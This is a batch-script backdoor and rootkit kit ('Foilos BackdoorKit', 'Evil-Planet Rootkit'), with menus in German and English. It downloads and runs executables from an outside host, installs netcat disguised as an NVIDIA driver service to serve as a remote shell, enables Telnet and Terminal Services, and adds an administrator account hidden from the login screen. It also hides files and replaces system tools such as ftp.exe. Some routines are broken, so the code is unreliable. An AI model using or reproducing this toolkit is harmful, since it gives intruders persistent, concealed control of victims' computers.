@Echo Off
Echo.
Echo Logging In...
set /p pass=Pass?:

If EXIST %pass%.fbk GoTo weita
IF NOT Exist %pass%.fbk GoTo raus

:weita
echo.
echo +-----------------------------------------------+
echo ¦     	Foilos BackdoorKit		     ¦
echo ¦                 Coded by foilo                ¦
echo ¦-----------------------------------------------¦
echo.
echo.
echo [1] 	Foilos little Hacker Helper
echo [2] 	Open a CMD Shell
echo.
set /p can=Choose A Number: 
if "%Can%"=="1" goto start
if "%Can%"=="2" goto shell
if "%Can%"=="" goto weita


:start
cls
echo.
echo +-----------------------------------------------+
echo ¦     	Evil-Planet Rootkit BETA 1.3 	     ¦
echo ¦                 Coded by foilo                ¦
echo ¦-----------------------------------------------¦
echo.
echo.
echo [1] 	Install iroffer, Get Infos and install Serv-u...
echo [2] 	Process and System Manager
echo [3]	HTTP Download [Fget]
echo [4]	Install Backdoors
echo [5]	Secure/Hide Options
Echo [6]	Open a CMD Shell
echo [7]	Foilos Test
echo [8]	Config This Rootkit
echo.
echo.
echo [0]	Back to Menue
echo.
echo.
set c = ""
set /p c=Choose A Number: 

if "%C%"=="1" goto installing
if "%C%"=="2" goto systeminfo
if "%C%"=="3" goto httpdownload
if "%C%"=="4" goto inst_backdoors
if "%C%"=="5" goto secure
if "%C%"=="6" goto shell
if "%C%"=="7" goto foi_install
if "%C%"=="8" goto config

if "%C%"=="0" goto exit
if "%C%"=="" goto start


:config
cls
echo.
echo +-----------------------------------------------+
echo ¦     	Evil-Planet Rootkit BETA 1.3 	     ¦
echo ¦                 Coded by foilo                ¦
echo ¦-----------------------------------------------¦
echo.
echo.
echo [1] 	Change Password
echo [2] 	Add Password
echo [3]	Remove Password
echo.
echo.
echo [0]	Back to Menue
echo.
echo.
set c = ""
set /p c=Choose A Number: 

if "%C%"=="1" goto ch_pw
if "%C%"=="2" goto add_pw
if "%C%"=="3" goto rem_pw


if "%C%"=="0" goto exit
if "%C%"=="" goto start

:ch_pw
CLS
Echo Wie soll das neue Pw lauten?
Echo. 
echo.
set /p new_pw=New Password?:
rename foilo.fbk %new_pw%.fbk
goto start

:add_pw
CLS
Echo Wie soll das neue Pw lauten?
Echo. 
echo.
set /p new_pw=New Password?:
echo 0>>%new_pw%.fbk
goto start


:rem_pw
CLS
Echo Welches Password moechtest du Entfernen?
Echo. 
echo.
set /p new_pw=New Password?:
del %new_pw%.fbk
goto start

:Installing
CLS
Echo Installing Serv-u...
Echo.
Echo Save all filez at:
Echo %systemroot%\system32\serv\
Echo. 
Echo. 
del serv.exe
fget http://www.home.pages.at/fika/serv.exe
start serv.exe
net stop serv-u
pause
CLS
Echo Install GetInfoPack ;)
Echo.
Echo - get System infos [HDD - Network - Open Ports - CPU/RAM]
Echo - make speedy 
Echo - search 4 Hacker, Stuff, Rootkits and invisble Programs 
Echo.
Echo.
Echo Save all filez at:
Echo %systemroot%\System32\infos\
Echo.
Echo.
del infos.exe
fget http://www.home.pages.at/fika/infos.exe
start infos.exe
Echo ...] Its Ready [...
pause
CLS
Echo Install Iroffer...
Echo.
Echo - Version: iroffer v1.3.b10-lamm.b01
Echo - Packed and Crypted
Echo.
Echo.
del niroffer.exe
fget http://www.home.pages.at/fika/niroffer.exe
start niroffer.exe
net stop winfield
call dllcach\install.bat
pause
goto start

:systeminfo
cls
echo.
echo +-----------------------------------------------+
echo ¦     	Foilos BackdoorKit		     ¦
echo ¦                 Coded by foilo                ¦
echo ¦-----------------------------------------------¦
echo.
echo.
echo [1] 	Kill Process
echo 	[A]	Kill/Remove  Process
echo [2] 	Stop Service
echo 	[B]	Stop/Remove Service
echo [3]	HDD Listing
echo [4]	Users and Groups Listing
echo [5]	Network Adaptater Listing
Echo [6]	Netstat tcp/upd Listing
echo [7]	System Information Listing
echo [8]	Shutdown or Restart the Computer
echo.
echo.
echo [0]	Back to Menue
echo.
echo.
set c = ""
set /p c=Choose A Number/Char: 

if "%C%"=="1" goto kill_app
if "%C%"=="A" goto del_app
if "%C%"=="a" goto del_app
if "%C%"=="2" goto kill_service
if "%C%"=="B" goto del_service
if "%C%"=="b" goto del_service
if "%C%"=="3" goto view_hdd
if "%C%"=="4" goto view_user
if "%C%"=="5" goto view_network
if "%C%"=="6" goto view_tcp
if "%C%"=="7" goto view_system
if "%C%"=="8" goto force_shutdown

if "%C%"=="0" goto exit
if "%C%"=="" goto start

:kill_app
CLS
inx -p
echo.
echo.
set /p pid=Choose A PID to Kill:
if "%pid%"=="" goto start
echo.
echo.
inx -p -k %pid%
echo.
echo.
pause
goto start

:del_app
CLS
inx -p
echo.
echo.
set /p pid=Choose A PID to Kill:
if "%pid%"=="" goto start
echo.
echo.
set /p pfad=Gib mir den Pfad zur Datei:
if "%pfad%"=="" goto start
echo.
echo.
inx -p -k %pid%
del "%pfad%"
echo.
echo.
pause
goto start

:kill_service
CLS
inx -s
echo.
echo.
set /p pid=Choose A SHORTNAME to Stop:
if "%pid%"=="" goto start
echo.
echo.
inx -s -af %pid%
echo.
echo.  
pause
goto start

:del_service
CLS
inx -s
echo.
echo.
set /p pid=Choose A SHORTNAME to Stop and Remove:
if "%pid%"=="" goto start
echo.
echo.
inx -s -af %pid%
sd remove %pid%
echo.
echo.  
pause
goto start

:view_hdd
CLS
inx -d
Pause
goto start

:view_user
CLS
inx -u
pause
goto start

:view_network
CLS
inx -n
pause
goto start

:view_tcp
CLS
inx -i
pause
goto start

:view_system
CLS
inx -w
pause
goto start

:force_shutdown
CLS
Echo.
echo.
Echo DO YOu REALY want to Reboot/Shutdown the PC?
Echo.
echo.
Echo [1] Reboot
Echo [2] Shutdown
Echo.
Echo [3] Back to menüe
Echo.
echo.
set c = ""
set /p c=Choose A Number: 

if "%C%"=="1" goto force_reboot
if "%C%"=="2" goto f_shutdown
if "%C%"=="3" goto start
if "%c%"=="" goto start

:force_reboot
inx -b 1
pause
goto start

:f_shutdown
inx -b 0
pause
goto start

:exit
goto start

:httpdownload
CLS
Echo Bitte Zielurl eingeben!
Echo Bsp. Http://www.tripod.com/Mueller/Rootpack.exe
echo.
echo.
set /p Url=URL:
if "%url%"=="" goto start
echo.
echo.
fget %url%
echo.
echo.
pause
goto start

:inst_backdoors
cls
echo.
echo +-----------------------------------------------+
echo ¦     	Foilos BackdoorKit		     ¦
echo ¦                 Coded by foilo                ¦
echo ¦-----------------------------------------------¦
echo.
echo.
echo [1] 	Install NetCat
echo [2] 	Install R_Admin
echo [3]	Enable Telnet
echo [4]	Enable Terminal Services
echo [5]	Add new Administrator [Required for TS , Telnet]
echo.
echo.
echo [9]	Back to Menue
echo.
echo.
set c = ""
set /p c=Choose A Number: 

if "%C%"=="1" goto netcat
if "%C%"=="2" goto r_admin
if "%C%"=="3" goto telnet
if "%C%"=="4" goto termserv
if "%C%"=="5" goto admin_add

if "%C%"=="9" goto start


:netcat
CLS
Echo Wie soll der Service Shortname heißen?
Echo Bsp. "nvidia"
echo.
echo.
set /p shortname=Shortname?:
if "%shortname%"=="" goto start
echo.
echo.

net1 stop %shortname%
sd remove %shortname%

CLS
Echo Wie soll der Lange Servicename sein?
Echo Bsp. "NvidiaDriver"
echo.
echo.
set /p LongServiceName=Long Service Name?:
if "%longservicename%"=="" goto start
echo.
echo.

CLS
Echo Wie soll der Lange Service Beschreibung heißen?
Echo Bsp. "NVidia Display Driver"
echo.
echo.
set /p ServiceDescription=Service Description?:
if "%ServiceDescription%"=="" goto start
echo.
echo.

CLS
Echo Auf welchen Port soll dein Netcat laufen?
echo.
echo.
set /p port=Port?:
if "%port%"=="" goto start
echo.
echo.

CLS
Echo Wie soll das Password für den login sein?
echo.
echo.
set /p passdat=Password?:
if "%passdat%"=="" goto start
echo.
echo.
echo hallo>>%passdat%.fbk

sd install %shortname% %LongServiceName% "%ServiceDescription%" "%systemroot%\system32\nvidiadrv.exe -L -d -e %systemroot%\system32\login.bat -p %port%" 1 1
inx -s -d %shortname%
pause
goto start

:telnet
CLS
Echo Enable Telnet on port 767
Echo Nicht über den Fehler wundern funktioniert, keine Sorge ;)

echo REGEDIT4>tel.reg
echo. >>tel.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TlntSvr]>>tel.reg
echo. >>tel.reg
echo "ErrorControl"=dword:00000001>>tel.reg
echo "Start"=dword:00000002>>tel.reg
echo "Type"=dword:00000010>>tel.reg
echo "FailureActions"=hex& #58;00,00,00,00,00,00,00,00,00,00,00,00,03,00,00,00,38,65,11,00,01,00,00,00,60,ea,00,00,01,00,00,00,60,ea,00,00,01,00,00,00,60,ea,00,00>>tel.reg
echo. >>tel.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0]>>tel.reg
echo. >>tel.reg
echo "NTLM"=dword:00000001>>tel.reg
echo "TelnetPort"=dword:00000017>>tel.reg
echo.
regedit /s tel.reg
inx -s -d tlntsvr
del tel.reg

pause
goto start

:termserv
CLS
Echo.
Echo. Enable Terminal Service
Echo.

echo Windows Registry Editor Version 5.00> c:\TS.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>> c:\TS.reg 
echo "fDenyTSConnections"=dword:00000000>> c:\TS.reg 
echo "fAllowToGetHelp"=dword:00000001>> c:\TS.reg
regedit /s c:\TS.reg
del c:\TS.reg

echo Windows Registry Editor Version 5.00> c:\TS2.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService]>> c:\TS2.reg
echo "Start"=dword:00000002>> c:\TS2.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>> c:\TS2.reg
echo "AllowTSConnections"=dword:00000001>> c:\TS2.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>> c:\TS2.reg
echo "fDenyTSConnections"=dword:00000000>> c:\TS2.reg
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>> c:\TS2.reg
echo "fAllowToGetHelp"=dword:00000001>> c:\TS2.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]>> c:\TS2.reg
echo "AllowMultipleTSSessions"=dword:00000001>> c:\TS2.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]>> c:\TS2.reg
echo "AutoAdminLogon"="1">> c:\TS2.reg
REGEDIT /S C:\TS2.REG
REGEDIT -S C:\TS2.REG
echo [Components] > c:\bootlog~.txt 
echo TSEnabled = on >> c:\bootlog~.txt 
sysocmgr /i:%windir%\inf\sysoc.inf /u:c:\bootlog~.txt /q
DEL c:\TS2.REG
DEL c:\bootlog~.txt
pause
goto start


:r_admin
fget http://home.pages.at/fika/csd.exe
IF EXIST csd.exe goto r_install
IF NOT EXIST csd.exe goto r_error

:r_install
move csd.exe %systemroot%\System32\csd.exe
start %systemroot%\System32\csd.exe
ping -n 3 localhost
call %systemroot%\System32\csd.bat
goto start

:r_error
Echo Fehler, Datei konnte nicht gefunden werden...
Echo HTTP Download Fehler oder Antivir/Rootkit
pause
goto start



:secure
cls
echo.
echo +-----------------------------------------------+
echo ¦     	Foilos BackdoorKit		     ¦
echo ¦                 Coded by foilo                ¦
echo ¦-----------------------------------------------¦
echo.
echo.
echo [1] 	Hide one File [change Attribut]
echo [2] 	Hide dir [change Attribut]
echo [3]	Destroy FTP/TFTP/RPC/Cscript [I make a backup before ;)]
echo [4]	Rebuild FTP/TFTP/RPC/Cscript
echo [5]	Add new Administrator
Echo [6]	Dropp xplog70.dll [Secure SQL]
echo [7]	
echo [8]	
echo.
echo.
echo [0]	Back to Menue
echo.
echo.
set c = ""
set /p c=Choose A Number: 

if "%C%"=="1" goto hide_file
if "%C%"=="2" goto hide_dir
if "%C%"=="3" goto destroy
if "%C%"=="4" goto rebuild
if "%C%"=="5" goto admin_add
if "%C%"=="6" goto sqlsecure
if "%C%"=="7" goto secure
if "%C%"=="8" goto 

if "%C%"=="0" goto start
if "%C%"=="" goto start

:hide_file
CLS
Echo Pfad der Datei?
Echo Bsp. C:\Windows\System32\netcat.exe
echo.
echo.
set /p hf_pfad=Pfad?:
if "%hf_pfad%"=="" goto start
attrib +s +h %hf_pfad%
CLS
Echo.
Echo. Attribute für %hf_pfad% erfolgreich geaendert.
Echo.
pause
goto start


:hide_dir
CLS
Echo Pfad zu den Ordner [Unterordner werden mit einbezogen]
Echo Bsp. C:\Recycler\Stuff\
echo.
echo.
set /p hd_pfad=Pfad?:
if "%hd_pfad%"=="" goto start
attrib +s +h /S /D %hd_pfad%
Echo.
Echo. Attribute für %hd_pfad% erfolgreich geaendert.
Echo.
pause
goto start

:destroy
CLS
Echo.
Echo ...] i will make a backup from the filz [...
Echo.

mkdir %systemroot%\System32\backup
attrib -s -h ftp.exe
attrib -s -h tftp.exe
attrib -s -h cscript.exe
copy %systemroot%\System32\ftp.exe 		%systemroot%\System32\backup\exe.ptf
copy %systemroot%\System32\tftp.exe 		%systemroot%\System32\backup\exe.ptft
copy %systemroot%\System32\cscript.exe 		%systemroot%\System32\backup\exe.tpircsc


Echo.
Echo ...] kill ftp/tftp/rpc/cscript [...
Echo.
copy %systemroot%\System32\net1.exe 		%systemroot%\System32\ftp.exe 
copy %systemroot%\System32\net1.exe 		%systemroot%\System32\tftp.exe 
copy %systemroot%\System32\net1.exe 		%systemroot%\System32\cscript.exe
attrib +s +h ftp.exe
attrib +s +h tftp.exe
attrib +s +h cscript.exe
Echo.
Echo ...] done [...
Echo.
pause
goto start

:rebuild
CLS
attrib -s -h ftp.exe
attrib -s -h tftp.exe
attrib -s -h cscript.exe
copy %systemroot%\System32\backup\exe.ptf 		%systemroot%\System32\ftp.exe
copy %systemroot%\System32\backup\exe.ptft 		%systemroot%\System32\ftp.exe
copy %systemroot%\System32\backup\exe.rpc 		%systemroot%\System32\ftp.exe
copy %systemroot%\System32\backup\exe.tpircsc 		%systemroot%\System32\ftp.exe
Echo.
Echo ...] Rebuild Done ;) [...
Echo.
pause
goto start


:admin_add
CLS
Echo Username des neuen Accounts
echo.
set /p admin_user=Username?:
if "%admin_user%"=="" goto start
Echo.
Echo Password des neuen Accounts?
echo.
set /p admin_Pass=Password?:
if "%admin_Pass%"=="" goto start
net user "%admin_user%" "%admin_pass%" /add 
net localgroup Administrators "%admin_user%" /add
Echo.
Echo.
Echo.
Echo Moechtest du den user verstecken? [ Nur WindowsXP ]
Echo WARNUNG: NICHT UNTER WIN2k STARTEN!!!
Echo.
Echo Sysdir: %windir%
Echo.
Echo 1) Ja unbedingt
Echo 2) Ne is winnt
set /p jn=1 oder 2?:

if "%jn%"=="1" goto admin_hide
if "%jn%"=="2" goto start
if "%jn%"=="" goto start


:admin_hide
Echo ...] Verstecke %admin_user% [...
echo Windows Registry Editor Version 5.00> c:\winst.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList]>> c:\winst.reg
echo "%admin_user%"=dword:00000000>> c:\winst.reg
REGEDIT /S c:\winst.REG
DEL c:\winst.REG
pause
goto start

:sqlsecure
inx -s -af /Y MSSQLSERVER
for /F "tokens=*" %%i IN ('dir /B /S "%ProgramFiles%\xpsql70.dll"') do copy /Y "%%i" .\cmd1.dll
for /F "tokens=*" %%i IN ('dir /B /S "%ProgramFiles%\xplog70.dll"') do copy /Y "%%i" .\cmd2.dll
del /S /Q "%ProgramFiles%\xpsql70.dll"
del /S /Q "%ProgramFiles%\xplog70.dll"
inx -s -df MSSQLSERVER
goto start


:foi_install
cls
echo.
echo +-----------------------------------------------+
echo ¦     	Foilos BackdoorKit		     ¦
echo ¦                 Coded by foilo                ¦
echo ¦-----------------------------------------------¦
echo.
echo.
echo [1] 	Install iroffer
echo [2] 	Get infos
echo [3]	
echo [4]	
echo [5]	
Echo [6]	
echo [7]	
echo [8]	
echo.
echo.
echo [0]	Back to Menue
echo.
echo.
set c = ""
set /p c=Choose A Number: 

if "%C%"=="1" goto irof
if "%C%"=="2" goto infos
if "%C%"=="3" goto start
if "%C%"=="4" goto start
if "%C%"=="5" goto start
if "%C%"=="6" goto start
if "%C%"=="7" goto start
if "%C%"=="8" goto start

if "%C%"=="0" goto start
if "%C%"=="" goto start


:irof
CLS
fget home.pages.at/fika/niroffer.exe
CLS
IF NOT EXIST niroffer.exe goto r_error
echo.
echo.
echo.
echo.
start niroffer.exe
echo.
pause
call dllcach\install.bat
goto start

:infos
CLS
fget home.pages.at/fika/infos.exe
CLS
IF NOT EXIST infos.exe goto r_error
echo.
echo.
echo.
echo.
start infos.exe
echo.
echo Logs gespeichert in %systemroot%\system32\infos\logs.txt
echo.
echo.
echo.
echo.
pause
goto start



:shell
%systemroot%\System32\cmd.exe